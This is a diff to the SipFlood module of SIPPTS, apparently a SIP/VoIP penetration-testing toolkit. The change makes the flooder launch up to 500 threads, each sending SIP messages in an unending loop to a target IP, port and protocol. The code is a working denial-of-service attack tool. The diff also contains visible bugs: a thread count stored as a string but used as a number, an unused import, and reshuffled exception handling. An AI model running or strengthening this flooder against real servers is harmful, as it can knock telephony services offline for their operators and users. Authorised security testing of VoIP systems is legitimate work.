@@ -7,6 +7,7 @@ __license__ = "GPL"
 __copyright__ = "Copyright (C) 2015-2022, SIPPTS"
 __email__ = "pepeluxx@gmail.com"
 
+from logging.handlers import NTEventLogHandler
 import os
 import socket
 import signal
@@ -14,6 +15,7 @@ import sys
 import ssl
 import fcntl
 import threading
+import time
 from lib.functions import create_message, get_free_port
 
 BRED = '\033[1;31;40m'
@@ -54,6 +56,8 @@ class SipFlood:
         self.user_agent = 'pplsip'
         self.digest = ''
         self.verbose = '0'
+        self.nthreads = '500'
+        self.count = 0
 
         self.run = True
 
@@ -90,20 +94,29 @@ class SipFlood:
 
         print(BWHITE + '[!] Target: ' + GREEN + '%s:%s/%s' %
               (self.ip, self.rport, self.proto))
+        print(BWHITE + '[!] Used threads: ' +
+             GREEN + '%d' % self.nthreads)
+        if self.nthreads > 300:
+            print(BRED + '[x] More than 300 threads can cause socket problems')
         print(WHITE)
 
         threads = list()
-        t = threading.Thread(target=self.flood, daemon=True)
-        threads.append(t)
-        t.start()
-        t.join()
 
+        for i in range(self.nthreads):
+            t = threading.Thread(target=self.flood, daemon=True)
+            threads.append(t)
+            t.start()
+            time.sleep(0.1)
+
+        for i, t in enumerate(threads):
+            t.join()
+ 
     def signal_handler(self, sig, frame):
-        print(BYELLOW + 'You pressed Ctrl+C!')
-        print(BWHITE + '\nStopping flood ...')
-        print(WHITE)
-
         self.stop()
+        time.sleep(0.1)
+        print(BYELLOW + '\nYou pressed Ctrl+C!')
+        print(BWHITE + '\nStopping flood ... wait a moment\n')
+        print(WHITE)
 
     def stop(self):
         self.run = False
@@ -123,63 +136,59 @@ class SipFlood:
         lport = get_free_port()
 
         try:
-            sock.bind((bind, lport))
-        except:
             lport = get_free_port()
             sock.bind((bind, lport))
 
-        host = (str(self.ip), int(self.rport))
+            host = (str(self.ip), int(self.rport))
 
-        if self.host != '' and self.domain == '':
-            self.domain = self.host
-        if self.domain == '':
-            self.domain = self.ip
-        if not self.from_domain or self.from_domain == '':
-            self.from_domain = self.domain
-        if not self.to_domain or self.to_domain == '':
-            self.to_domain = self.domain
+            if self.host != '' and self.domain == '':
+                self.domain = self.host
+            if self.domain == '':
+                self.domain = self.ip
+            if not self.from_domain or self.from_domain == '':
+                self.from_domain = self.domain
+            if not self.to_domain or self.to_domain == '':
+                self.to_domain = self.domain
 
-        if self.contact_domain == '':
-            self.contact_domain = '10.0.0.1'
+            if self.contact_domain == '':
+                self.contact_domain = '10.0.0.1'
 
-        msg = create_message(self.method, self.contact_domain, self.from_user, self.from_name, self.from_domain,
-                             self.to_user, self.to_name, self.to_domain, self.proto, self.domain, self.user_agent, lport, '', '', '', '1', '', self.digest, 1, '', 0, '', '')
+            msg = create_message(self.method, self.contact_domain, self.from_user, self.from_name, self.from_domain,
+                                self.to_user, self.to_name, self.to_domain, self.proto, self.domain, self.user_agent, lport, '', '', '', '1', '', self.digest, 1, '', 0, '', '')
 
-        count = 1
-
-        try:
-            sock.settimeout(1)
-
-            if self.proto == 'TCP':
-                sock.connect(host)
-
-            if self.proto == 'TLS':
-                sock_ssl = ssl.wrap_socket(
-                    sock, ssl_version=ssl.PROTOCOL_TLS, ciphers=None, cert_reqs=ssl.CERT_NONE)
-                sock_ssl.connect(host)
-        except:
-            print('Socket connection error')
-            exit()
-
-        while self.run == True:
             try:
+                sock.settimeout(1)
+
+                if self.proto == 'TCP':
+                    sock.connect(host)
+
                 if self.proto == 'TLS':
-                    sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
-                else:
-                    sock.sendto(bytes(msg[:8192], 'utf-8'), host)
-
-                if self.verbose == 2:
-                    print(BWHITE + '[+] Sending to %s:%s ...' %
-                          (self.ip, self.rport))
-                    print(YELLOW + msg)
-                elif self.verbose == 1:
-                    print(BWHITE + '[%s] Sending %s to %s:%s/%s ...' % (str(count),
-                          self.method.upper(), self.ip, self.rport, self.proto), end="\r")
-                    count += 1
-
-            except socket.timeout:
-                pass
+                    sock_ssl = ssl.wrap_socket(
+                        sock, ssl_version=ssl.PROTOCOL_TLS, ciphers=None, cert_reqs=ssl.CERT_NONE)
+                    sock_ssl.connect(host)
             except:
-                pass
+                print('Socket connection error')
+                exit()
 
-        print(WHITE)
+            while self.run == True:
+                try:
+                    if self.proto == 'TLS':
+                        sock_ssl.sendall(bytes(msg[:8192], 'utf-8'))
+                    else:
+                        sock.sendto(bytes(msg[:8192], 'utf-8'), host)
+
+                    if self.verbose == 2:
+                        print(BWHITE + '[+] Sending to %s:%s ...' %
+                            (self.ip, self.rport))
+                        print(YELLOW + msg)
+                    elif self.verbose == 1:
+                        print(BWHITE + '[%s] Sending %s to %s:%s/%s ...' % (str(self.count),
+                            self.method.upper(), self.ip, self.rport, self.proto), end="\r")
+                        self.count += 1
+
+                except socket.timeout:
+                    pass
+                except:
+                    pass
+        except:
+            pass
